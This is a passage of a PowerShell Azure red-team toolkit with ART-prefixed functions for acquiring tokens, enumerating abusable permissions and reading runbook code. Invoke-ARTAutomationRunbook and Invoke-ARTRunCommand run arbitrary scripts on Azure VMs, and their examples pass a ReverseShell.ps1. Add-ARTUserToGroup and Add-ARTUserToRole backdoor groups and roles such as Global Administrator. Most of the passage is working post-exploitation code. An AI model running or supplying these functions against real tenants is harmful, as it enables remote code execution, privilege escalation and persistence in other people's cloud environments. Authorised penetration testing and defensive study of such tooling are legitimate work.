        $parsed = Parse-JWTtokenRT $token
        Write-Verbose "Token for Resource: $($parsed.aud)"

        Return $token
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


#
# SOURCE:
#   https://blog.simonw.se/getting-an-access-token-for-azuread-using-powershell-and-device-login-flow/
#
# AUTHOR:
#   Simon Wahlin, @SimonWahlin 
#
function Get-ARTAccessTokenAzureAD {
    <#
    .SYNOPSIS
        Gets an access token from Azure Active Directory via Device sign-in.

    .DESCRIPTION
        Gets an access token from Azure Active Directory that can be used to authenticate to for example Microsoft Graph or Azure Resource Manager.

        Run without parameters to get an access token to Microsoft Graph and the users original tenant.

        Use the parameter -Interactive and the script will open the sign in experience in the default browser without user having to copy any code.

    .PARAMETER ClientID
        Application client ID, defaults to well-known ID for Microsoft Azure PowerShell

    .PARAMETER Interactive
        Tries to open sign-in experience in default browser. If this succeeds the user don't need to copy and paste any device code.

    .PARAMETER TenantID
        ID of tenant to sign in to, defaults to the tenant where the user was created

    .PARAMETER Resource
        Identifier for target resource, this is where the token will be valid. Defaults to  "https://graph.microsoft.com/"
        Use "https://management.azure.com" to get a token that works with Azure Resource Manager (ARM)

    .EXAMPLE
        $Token = Get-ARTAccessTokenAzureAD -Interactive
        $Headers = @{'Authorization' = "Bearer $Token" }
        $UsersUri = 'https://graph.microsoft.com/v1.0/users?$top=5'
        $Users = Invoke-RestMethod -Method GET -Uri $UsersUri -Headers $Headers
        $Users.value.userprincipalname

        Using Microsoft Graph to print the userprincipalname of 5 users in the tenant.

    .EXAMPLE
        $Token = Get-ARTAccessTokenAzureAD -Interactive -Resource 'https://management.azure.com'
        $Headers = @{'Authorization' = "Bearer $Token" }
        $SubscriptionsURI = 'https://management.azure.com/subscriptions?api-version=2019-11-01'
        $Subscriptions = Invoke-RestMethod -Method GET -Uri $SubscriptionsURI -Headers $Headers
        $Subscriptions.value.displayName

        Using Azure Resource Manager (ARM) to print the display name for all the subscriptions the user has access to.

    .NOTES

    #>

    [cmdletbinding()]
    param( 
        [Parameter()]
        $ClientID = '1950a258-227b-4e31-a9cf-717495945fc2',
        
        [Parameter()]
        [switch]$Interactive,
        
        [Parameter()]
        $TenantID = 'common',
        
        [Parameter()]
        $Resource = "https://graph.microsoft.com/",
        
        # Timeout in seconds to wait for user to complete sign in process
        [Parameter(DontShow)]
        $Timeout = 300
    )
    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $DeviceCodeRequestParams = @{
            Method = 'POST'
            Uri    = "https://login.microsoftonline.com/$TenantID/oauth2/devicecode"
            Body   = @{
                resource  = $Resource
                client_id = $ClientId
            }
        }
        $DeviceCodeRequest = Invoke-RestMethod @DeviceCodeRequestParams

        if ($Interactive.IsPresent) {
            Write-Host 'Trying to open a browser with login prompt. Please sign in.' -ForegroundColor Yellow
            Start-Sleep -Second 1
            $PostParameters = @{otc = $DeviceCodeRequest.user_code }
            $InputFields = foreach ($entry in $PostParameters.GetEnumerator()) {
                "<input type=`"hidden`" name=`"$($entry.Name)`" value=`"$($entry.Value)`">"
            }
            $PostUrl = "https://login.microsoftonline.com/common/oauth2/deviceauth"
            $LocalHTML = @"
        <!DOCTYPE html>
<html>
 <head>
  <title>&hellip;</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <script type="text/javascript">
   function dosubmit() { document.forms[0].submit(); }
  </script>
 </head>
 <body onload="dosubmit();">
  <form action="$PostUrl" method="POST" accept-charset="utf-8">
   $InputFields
  </form>
 </body>
</html>
"@
            $TempPage = New-TemporaryFile
            $TempPage = Rename-Item -Path $TempPage.FullName ($TempPage.FullName -replace '$', '.html') -PassThru    
            Out-File -FilePath $TempPage.FullName -InputObject $LocalHTML
            Start-Process $TempPage.FullName
        }
        else {
            Write-Host $DeviceCodeRequest.message -ForegroundColor Yellow
        }

        $TokenRequestParams = @{
            Method = 'POST'
            Uri    = "https://login.microsoftonline.com/$TenantId/oauth2/token"
            Body   = @{
                grant_type = "urn:ietf:params:oauth:grant-type:device_code"
                code       = $DeviceCodeRequest.device_code
                client_id  = $ClientId
            }
        }
        $TimeoutTimer = [System.Diagnostics.Stopwatch]::StartNew()
        while ([string]::IsNullOrEmpty($TokenRequest.access_token)) {
            if ($TimeoutTimer.Elapsed.TotalSeconds -gt $Timeout) {
                throw 'Login timed out, please try again.'
            }
            $TokenRequest = try {
                Invoke-RestMethod @TokenRequestParams -ErrorAction Stop
            }
            catch {
                $Message = $_.ErrorDetails.Message | ConvertFrom-Json
                if ($Message.error -ne "authorization_pending") {
                    throw
                }
            }
            Start-Sleep -Seconds 1
        }
        Write-Output $TokenRequest.access_token
    }
    finally {
        try {
            Remove-Item -Path $TempPage.FullName -Force -ErrorAction Stop
            $TimeoutTimer.Stop()
        }
        catch {
            # We don't care about errors here
        }
    }
}

Function Get-ARTDangerousPermissions {
    <#
    .SYNOPSIS
        Displays Permissions on Azure Resources that could facilitate further Attacks.

    .DESCRIPTION
        Analyzes accessible Azure Resources and associated permissions user has on them to find all the Dangerous ones that could be abused by an attacker.

    .PARAMETER AccessToken
        Optional, specifies JWT Access Token for the https://management.azure.com resource.

    .PARAMETER SubscriptionId
        Optional parameter specifying which Subscription should be requested.

    .PARAMETER Text
        If specified, output will be printed as pre-formatted text. By default a Powershell array is returned.

    .EXAMPLE
        PS> Get-ARTDangerousPermissions -AccessToken 'eyJ0eXA...'
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)][String]
        $AccessToken = $null,
        
        [Parameter(Mandatory=$False)][String]
        $SubscriptionId = $null,

        [Switch]
        $Text
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $resource = "https://management.azure.com"

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
            $AccessToken = Get-ARTAccessTokenAz -Resource $resource
        }

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Error "Could not obtain required Access Token!"
            Return
        }

        $headers = @{
            'Authorization' = "Bearer $AccessToken"
        }

        $parsed = Parse-JWTtokenRT $AccessToken

        if(-not $parsed.aud -like 'https://management.*') {
            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
        }

        #$resource = $parsed.aud

        Write-Verbose "Will use resource: $resource"

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            $SubscriptionId = Get-ARTSubscriptionId -AccessToken $AccessToken
        }

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            Write-Error "Could not acquire Subscription ID!"
            Return
        }

        Write-Verbose "Enumerating resources on subscription: $SubscriptionId"

        $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value

        if($resources.Length -eq 0 ) {
            if($Text) {
                Write-Host "No available resourources found or lacking required permissions."
            }
            else {
                Write-Verbose "No available resourources found or lacking required permissions."
            }

            Return
        }

        $DangerousPermissions = New-Object System.Collections.ArrayList
        $dangerousscopes = New-Object System.Collections.ArrayList

        $resources | % {
            try {
                $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
            }
            catch {
                $permissions = @()
            }

            foreach ($dangperm in $KnownDangerousPermissions.GetEnumerator()) {
                foreach ($perm in $permissions) {
                    if ($perm -like "*$($dangperm.Name)*") {

                        $obj = [PSCustomObject]@{
                            DangerousPermission = $dangperm.Name
                            ResourceName        = $_.name
                            ResourceGroupName   = $_.id.Split('/')[4]
                            ResourceType        = $_.type
                            PermissionsGranted  = $perm
                            Description         = $dangperm.Value
                            Scope               = $_.id
                        }

                        if($_.id -notin $dangerousscopes) {
                            $null = $DangerousPermissions.Add($obj)
                        }
                    }
                }
            }
        }

        if ($Text) {
            $num = 1
           
            if($DangerousPermissions -ne $null) {
                Write-Host "=== Dangerous Permissions Identified on Azure Resources ===`n" -ForegroundColor Magenta

                $DangerousPermissions | % {
                    Write-Host "`n`t$($num)."
                    Write-Host "`tDangerous Permission :`t$($_.DangerousPermission)" -ForegroundColor Red
                    Write-Host "`tResource Name        :`t$($_.ResourceName)" -ForegroundColor Green
                    Write-Host "`tResource Group Name  :`t$($_.ResourceGroupName)"
                    Write-Host "`tResource Type        :`t$($_.ResourceType)"
                    Write-Host "`tScope                :`t$($_.Scope)"
                    Write-Host "`tDescription          : $($_.Description)"

                    $num += 1
                }
            }
        }
        else {
            $DangerousPermissions
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTResource {
    <#
    .SYNOPSIS
        Displays accessible Azure Resources along with corresponding permissions user has on them.

    .DESCRIPTION
        Authenticates to the https://management.azure.com using provided Access Token and pulls accessible resources and permissions that token Owner have against them.

    .PARAMETER AccessToken
        Optional, specifies JWT Access Token for the https://management.azure.com resource.

    .PARAMETER SubscriptionId
        Optional parameter specifying which Subscription should be requested.

    .PARAMETER Text
        If specified, output will be printed as pre-formatted text. By default a Powershell array is returned.

    .EXAMPLE
        PS> Get-ARTResource -AccessToken 'eyJ0eXA...'
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)][String]
        $AccessToken = $null,
        
        [Parameter(Mandatory=$False)][String]
        $SubscriptionId = $null,

        [Switch]
        $Text
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $resource = "https://management.azure.com"

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Verbose "Access Token not provided. Requesting one from Get-AzAccessToken ..."
            $AccessToken = Get-ARTAccessTokenAz -Resource $resource
        }

        if ($AccessToken -eq $null -or $AccessToken -eq ""){ 
            Write-Error "Could not obtain required Access Token!"
            Return
        }

        $headers = @{
            'Authorization' = "Bearer $AccessToken"
        }

        $parsed = Parse-JWTtokenRT $AccessToken

        if(-not $parsed.aud -like 'https://management.*') {
            Write-Warning "Provided JWT Access Token is not scoped to https://management.azure.com or https://management.core.windows.net! Instead its scope is: $($parsed.aud)"
        }

        #$resource = $parsed.aud

        Write-Verbose "Will use resource: $resource"

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            $SubscriptionId = Get-ARTSubscriptionId -AccessToken $AccessToken
        }

        if($SubscriptionId -eq $null -or $SubscriptionId -eq "") {
            Write-Error "Could not acquire Subscription ID!"
            Return
        }

        Write-Verbose "Enumerating resources on subscription: $SubscriptionId"

        $resources = (Invoke-RestMethod -Uri "$resource/subscriptions/$SubscriptionId/resources?api-version=2021-04-01" -Headers $headers).value

        if($resources.Length -eq 0 ) {
            if($Text) {
                Write-Host "No available resourources found or lacking required permissions."
            }
            else {
                Write-Verbose "No available resourources found or lacking required permissions."
            }

            Return
        }

        $Coll = New-Object System.Collections.ArrayList

        $resources | % {
            try
            {
                $permissions = ((Invoke-RestMethod -Uri "https://management.azure.com$($_.id)/providers/Microsoft.Authorization/permissions?api-version=2018-07-01" -Headers $headers).value).actions
            }
            catch
            {
                $permissions = @()
            }

            $obj = [PSCustomObject]@{
                Name              = $_.name
                ResourceGroupName = $_.id.Split('/')[4]
                ResourceType      = $_.type
                Permissions       = $permissions
                Scope             = $_.id
            }

            $null = $Coll.Add($obj)
        }

        if ($Text) {
            Write-Host "=== Accessible Azure Resources & Permissions ==`n"

            $num = 1
            $Coll | % {
                Write-Host "`n`t$($num)."
                Write-Host "`tName                :`t$($_.Name)"
                Write-Host "`tResource Group Name :`t$($_.ResourceGroupName)"
                Write-Host "`tResource Type       :`t$($_.ResourceType)"
                Write-Host "`tScope               :`t$($_.Scope)"
                Write-Host "`tPermissions: $($_.Permissions.Length)"
                
                $_.Permissions | % {
                    Write-Host "`t`t- $_"
                }

                $num += 1
            }
        }
        else {
            $Coll
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTADRolePermissions {
    <#
    .SYNOPSIS
        Shows Azure AD role permissions.

    .DESCRIPTION
        Displays all granted permissions on a specified Azure AD role.

    .PARAMETER RoleName
        Name of the role to inspect.

    .EXAMPLE
        PS> Get-ARTADRolePermissions -RoleName "Global Administrator"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        (Get-AzureADMSRoleDefinition -Filter "displayName eq '$RoleName'").RolePermissions | select -Expand AllowedResourceActions | Format-List
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTRolePermissions {
    <#
    .SYNOPSIS
        Shows Azure role permissions.

    .DESCRIPTION
        Displays all granted permissions on a specified Azure RBAC role.

    .PARAMETER RoleName
        Name of the role to inspect.

    .EXAMPLE
        PS> Get-ARTRolePermissions -RoleName Owner
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        try {
            $role = Get-AzRoleDefinition -Name $RoleName
        }
        catch {
            Write-Host "[!] Could not get Role Definition. Possibly due to lacking privileges or lack of connection."
            Throw
            Return
        }

        Write-Host "Role Name      : $RoleName"
        Write-Host "Is Custom Role : $($role.IsCustom)"

        if($role.Actions.Length -gt 0 ) {
            Write-Host "`nActions:"
            $role.Actions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.NotActions.Length -gt 0 ) {
            Write-Host "`nNotActions:"
            $role.NotActions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.DataActions.Length -gt 0 ) {
            Write-Host "`nDataActions:"
            $role.DataActions | % {
                Write-Host "`t- $($_)"
            }
        }

        if($role.NotDataActions.Length -gt 0 ) {
            Write-Host "`nNotDataActions:"
            $role.NotDataActions | % {
                Write-Host "`t- $($_)"
            }
        }

        Write-Host ""
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTAutomationRunbookCode {
    <#
    .SYNOPSIS
        Retrieves automation's runbook code.

    .DESCRIPTION
        Invokes REST API method to pull specified Runbook's source code.

    .PARAMETER RunbookName
        Specifies Runbook's name.

    .PARAMETER OutFile
        Optional file name where to save retrieved source code.

    .PARAMETER AutomationAccountName
        Azure Automation account name that contains target runbook.

    .PARAMETER ResourceGroupName
        Azure Resource Group name that contains target Automation Account

    .PARAMETER SubscriptionId
        Azure Subscrition ID that contains target Resource Group

    .EXAMPLE
        Example 1: Will attempt to automatically find requested runbook and retrieve its code.
        PS> Get-ARTAutomationRunbookCode -RunbookName MyLittleRunbook
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RunbookName,

        [Parameter(Mandatory=$False)]
        [String]
        $SubscriptionId = $null,

        [Parameter(Mandatory=$False)]
        [String]
        $AutomationAccountName = $null,

        [Parameter(Mandatory=$False)]
        [String]
        $ResourceGroupName = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'
        
        if(($AutomationAccount -eq $null -or $AutomationAccountName.Length -eq 0) -or ($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0) -or ($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0)) {
            Get-AzAutomationAccount | % {
                $AutomationAccount = $_

                Write-Verbose "Enumerating account $($AutomationAccount.AutomationAccountName) in resource group $($AutomationAccount.ResourceGroupName) ..."

                Get-AzAutomationRunbook -AutomationAccountName $AutomationAccount.AutomationAccountName -ResourceGroupName $AutomationAccount.ResourceGroupName | % {
                    $Runbook = $_

                    Write-Verbose "`tEnumerating runbook $($Runbook.Name) ..."

                    if($_.Name -match $RunbookName) {
                        $AutomationAccountName = $AutomationAccount.AutomationAccountName
                        $ResourceGroupName = $AutomationAccount.ResourceGroupName
                        $SubscriptionId = $AutomationAccount.SubscriptionId

                        Write-Host "[+] Found requested Runbook in account: $AutomationAccountName - Resource group: $ResourceGroupName" -ForegroundColor Green
                        break
                    }
                }

                if(($SubscriptionId -ne $null -and $SubscriptionId.Length -gt 0) -and ($AutomationAccountName -ne $null -and $AutomationAccountName.Length -gt 0) -and ($ResourceGroupName -ne $null -and $ResourceGroupName.Length -gt 0)) {
                    break
                }
            }
        }

        Write-Host "Runbook parameters:"
        Write-Host "`t- RunbookName          : $RunbookName"
        Write-Host "`t- AutomationAccountName: $AutomationAccountName"
        Write-Host "`t- ResourceGroupName    : $ResourceGroupName"
        Write-Host "`t- SubscriptionId       : $SubscriptionId`n"

        if(($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) -or ($AutomationAccountName -eq $null -or $AutomationAccountName.Length -eq 0) -or ($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0)) {
            Write-Host "[!] Runbook not found!" -ForegroundColor Red
            Return
        }

        Write-Verbose "Acquiring Azure access token from Connect-AzAccount..."
        $AccessToken = Get-ARTAccessTokenAz -Resource https://management.azure.com

        if ($AccessToken -eq $null -or $AccessToken.Length -eq 0 ) {
            throw "Could not acquire Access Token!"
        }

        $URI = "https://management.azure.com/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroupName/providers/Microsoft.Automation/automationAccounts/$AutomationAccount/runbooks/$RunbookName/draft/content?api-version=2015-10-31"

        $out = Invoke-ARTGETRequest -Uri $URI -AccessToken $AccessToken

        if($out.Length -gt 0) {
            if($OutFile -ne $null -and $OutFile.Length -gt 0) {
                $out | Out-File $OutFile

                Write-Host "[+] Runbook's code written to file: $OutFile" -ForegroundColor Green
            }
            else {
                Write-Host "============================================================`n" -ForegroundColor Magenta
                
                Write-Host $out

                Write-Host "`n============================================================`n" -ForegroundColor Magenta
            }
        }
        else {
            Write-Host "[-] Returned empty Runbook's code." -ForegroundColor Magenta
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Invoke-ARTAutomationRunbook {
    <#
    .SYNOPSIS
        Invokes supplied Powershell script/command via Automation Runbook.

    .DESCRIPTION
        Creates an Automation Runbook under specified Automation Account and against selected Worker Group.
        That Runbook will contain Powershell commands to be executed on all the affected Azure VMs.

    .PARAMETER RunbookName
        Specifies Runbook's name to create.

    .PARAMETER ScriptPath
        Path to the Powershell script file.

    .PARAMETER Command
        Command to be executed in Runbook.

    .PARAMETER RemoveAfter
        Remove Runbook after running it.

    .PARAMETER AutomationAccountName
        Target Azure Automation account name.

    .PARAMETER ResourceGroupName
        Target Azure Resource Group name.

    .PARAMETER WorkergroupName
        Target Azure Workgroup Name.

    .EXAMPLE
        PS> Invoke-ARTAutomationRunbook -RunbookName MyLittleRunbook -ScriptPath .\ReverseShell.ps1 -Verbose
    #>

    [CmdletBinding(DefaultParameterSetName = 'Auto')]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $RunbookName,

        [String]
        $ScriptPath = $null,

        [String]
        $Command = $null,

        [Switch]
        $RemoveAfter,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $AutomationAccountName = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $ResourceGroupName = $null,

        [Parameter(Mandatory=$True, ParameterSetName = 'Manual')]
        [String]
        $WorkergroupName = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
            Return
        }

        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
            Return
        }

        $createdFile = $false

        if ($Command -ne $null -and $Command.Length -gt 0) {
            $File = New-TemporaryFile
            $ScriptPath = $File.FullName
            Remove-Item $ScriptPath
            $ScriptPath = $ScriptPath + ".ps1"

            Write-Verbose "Writing supplied commands to a temporary file..."
            $Command | Out-File $ScriptPath
            $createdFile = $true
        }

        $AutomationAccount = Get-AzAutomationAccount

        Write-Host "`nStep 1. Get the role of a user on the Automation account"
        $roles = (Get-AzRoleAssignment | ? { $_.Scope -like '*Microsoft.Automation*' } | ? { $_.RoleDefinitionName -match 'Contributor' -or $_.RoleDefinitionName -match 'Owner' })

        if ($roles -eq $null -or $roles.Length -eq 0 ) {
            Write-Warning "Did not find assigned Roles for the Azure Automation service. The principal may be unauthorized to import Runbooks!"
        }
        else {
            $r = $roles[0].RoleDefinitionName
            Write-Host "[+] Principal has $r rights over Azure Automation."
        }

        if($PsCmdlet.ParameterSetName -eq "Auto") {
            if ($roles -eq $null -or $roles.Length -eq 0 ) {
                throw "Unable to automatically establish Automation Account Name and Resource Group Name. Pass them manually via parameters."
                return
            }

            $parts = $roles[0].Scope.Split('/')

            if($AutomationAccountName -eq $null -or $AutomationAccountName.Length -eq 0) {
                $AutomationAccountName = $parts[8]
            }

            if($AutomationAccountName -eq $null -or $ResourceGroupName.Length -eq 0) {
                $ResourceGroupName = $parts[4]
            }
        }
        
        Write-Verbose "[.] Will target resource group: $ResourceGroupName and automation account: $AutomationAccountName"

        if($WorkergroupName -eq $null -or $WorkergroupName.Length -eq 0) {
            Write-Host "`nStep 2. List hybrid workers"
            $workergroup = Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName
            $Workergroup

            $WorkergroupName = $workergroup.Name
        }
        else {
            Write-Host "`nStep 2. Will use hybrid worker group: $WorkergroupName"
        }

        Write-Host "`nStep 3. Create a Powershell Runbook`n"
        Import-AzAutomationRunbook -Name $RunbookName -Path $ScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force -Verbose

        Write-Host "`nStep 4. Publish the Runbook`n"
        Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose

        Write-Host "`nStep 5. Start the Runbook`n"
        Start-AzAutomationRunbook -RunbookName $RunbookName -RunOn $WorkergroupName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Verbose

        if($RemoveAfter) {
            Write-Host "`nStep 6. Removing the Runbook.`n"
            Remove-AzAutomationRunbook -AutomationAccountName $AutomationAccountName -Name $RunbookName -ResourceGroupName $ResourceGroupName -Force
        }

        if($createdFile) {
            Remove-Item $ScriptPath
        }

        Write-Host "Attack finished."
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Invoke-ARTRunCommand {
    <#
    .SYNOPSIS
        Invokes supplied Powershell script/command on a controlled Azure VM.

    .DESCRIPTION
        Abuses virtualMachines/runCommand permission against a specified Azure VM to run custom Powershell command.

    .PARAMETER VMName
        Specifies Azure VM name to target.

    .PARAMETER ScriptPath
        Path to the Powershell script file.

    .PARAMETER Command
        Command to be executed in Azure VM.

    .PARAMETER ResourceGroupName
        Target Azure Resource Group name.

    .EXAMPLE
        PS> Invoke-ARTRunCommand -VMName MyVM1 -ScriptPath .\ReverseShell.ps1 -Verbose
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $VMName,

        [String]
        $ScriptPath = $null,

        [String]
        $Command = $null,

        [Parameter(Mandatory=$False)]
        [String]
        $ResourceGroupName = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if ($ScriptPath -ne $null -and $Command -ne $null -and $ScriptPath.Length -gt 0 -and $Command.Length -gt 0) {
            Write-Error "-ScriptPath and -Command are mutually exclusive. Pick one to continue."
            Return
        }

        if (($ScriptPath -eq $null -and $Command -eq $null) -or ($ScriptPath.Length -eq 0 -and $Command.Length -eq 0)) {
            Write-Error "Missing one of the required parameters: -ScriptPath or -Command"
            Return
        }

        $createdFile = $false

        if ($Command -ne $null -and $Command.Length -gt 0) {
            $File = New-TemporaryFile
            $ScriptPath = $File.FullName
            Remove-Item $ScriptPath
            $ScriptPath = $ScriptPath + ".ps1"

            Write-Verbose "Writing supplied commands to a temporary file..."
            $Command | Out-File $ScriptPath
            $createdFile = $true
        }

        if($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0) {
            Write-Verbose "Searching for a specified VM..."

            Get-AzVM | % {
                if($_.name -eq $VMName) {
                    $ResourceGroupName = $_.ResourceGroupName
                    Write-Verbose "Found Azure VM: $($_.Name) / $($_.ResourceGroupName)"
                    break
                }
            }
        }

        Write-Host "[+] Running command on $($VMName) / $($ResourceGroupName) ..."

        Write-Host "=============================="

        Invoke-AzVMRunCommand -VMName $VMName -ResourceGroupName $ResourceGroupName -CommandId 'RunPowerShellScript' -ScriptPath $ScriptPath

        Write-Host "=============================="

        if($createdFile) {
            Remove-Item $ScriptPath
        }

        Write-Host "[+] Attack finished." -ForegroundColor Green
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Add-ARTUserToGroup {
    <#
    .SYNOPSIS
        Adds user to an Azure AD group.

    .DESCRIPTION
        Adds a specified Azure AD User to the specified Azure AD Group.

    .PARAMETER Account
        Specifies Account ID/DisplayName/UserPrincipalName that is to be added to the Group.

    .PARAMETER GroupName
        Specifies target Group that is to be backdoored with new user.

    .EXAMPLE
        PS> Add-ARTUserToGroup -Account myuser -GroupName "My Company Admins"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $Account,

        [Parameter(Mandatory=$True)]
        [String]
        $GroupName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }

        if ($User -eq $null -or $User.ObjectId -eq $null) {
            Write-Error "Could not find target user with Account: $Account"
            Return
        }

        $Group = Get-AzureADGroup | ? { $_.ObjectId -eq $GroupName -or $_.DisplayName -eq $GroupName}

        if ($Group -eq $null -or $Group.ObjectId -eq $null) {
            Write-Error "Could not find target group with name: $GroupName"
            Return
        }

        Add-AzureADGroupMember -ObjectId $Group.ObjectId -RefObjectId $User.ObjectId

        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Group $($Group.DisplayName) ($($Group.ObjectId))"
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}

Function Get-ARTRoleAssignment {
    <#
    .SYNOPSIS
        Displays Azure Role assignment on a currently authenticated user.

    .PARAMETER Scope
        Optional parameter that specifies which Azure Resource IAM Access Policy is to be examined.

    .DESCRIPTION
        Displays a bit easier to read representation of assigned Azure RBAC roles to the currently used Principal.

    .EXAMPLE
        Example 1: Examine Roles Assigned on a current User
        PS> Get-ARTRoleAssignment | Format-Table

        Example 2: Examine Roles Assigned on a specific Azure VM
        PS> Get-ARTRoleAssignment -Scope /subscriptions/<SUB-ID>/resourceGroups/<ResGrName>/providers/Microsoft.Compute/virtualMachines/<VM-Name>
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $Scope
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if($Scope -ne $null -and $Scope.Length -gt 0 ) {

            Write-Verbose "Pulling Azure RBAC Role Assignment on resource scoped to:`n`t$Scope`n"
            $roles = Get-AzRoleAssignment -Scope $Scope
        }
        else {
            $roles = Get-AzRoleAssignment
        }

        $Coll = New-Object System.Collections.ArrayList
        $roles | % {
            $parts = $_.Scope.Split('/')
            $scope = $parts[6..$parts.Length] -join '/'

            $obj = [PSCustomObject]@{
                DisplayName       = $_.DisplayName
                RoleDefinitionName= $_.RoleDefinitionName
                Resource          = $scope
                ResourceGroup     = $parts[4]
                ObjectType        = $_.ObjectType
                SignInName        = $_.SignInName
                CanDelegate       = $_.CanDelegate
                ObjectId          = $_.ObjectId
                Scope             = $_.Scope
            }

            $null = $Coll.Add($obj)
        }

        $Coll
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}



Function Add-ARTUserToRole {
    <#
    .SYNOPSIS
        Assigns a Azure AD Role to the user.

    .DESCRIPTION
        Adds a specified Azure AD User to the specified Azure AD Role.

    .PARAMETER Account
        Specifies Account ID/DisplayName/UserPrincipalName that is to be added to the Role.

    .PARAMETER RoleName
        Specifies target Role that is to be backdoored with new user.

    .EXAMPLE
        PS> Add-ARTUserToRole -Account myuser -RoleName "Global Administrator"
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $Account,

        [Parameter(Mandatory=$True)]
        [String]
        $RoleName
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $User = Get-AzureADUser | ? { $_.ObjectId -eq $Account -or $_.DisplayName -eq $Account -or $_.UserPrincipalName -eq $Account }

        if ($User -eq $null -or $User.ObjectId -eq $null) {
            Write-Error "Could not find target user with Account: $Account"
            Return
        }

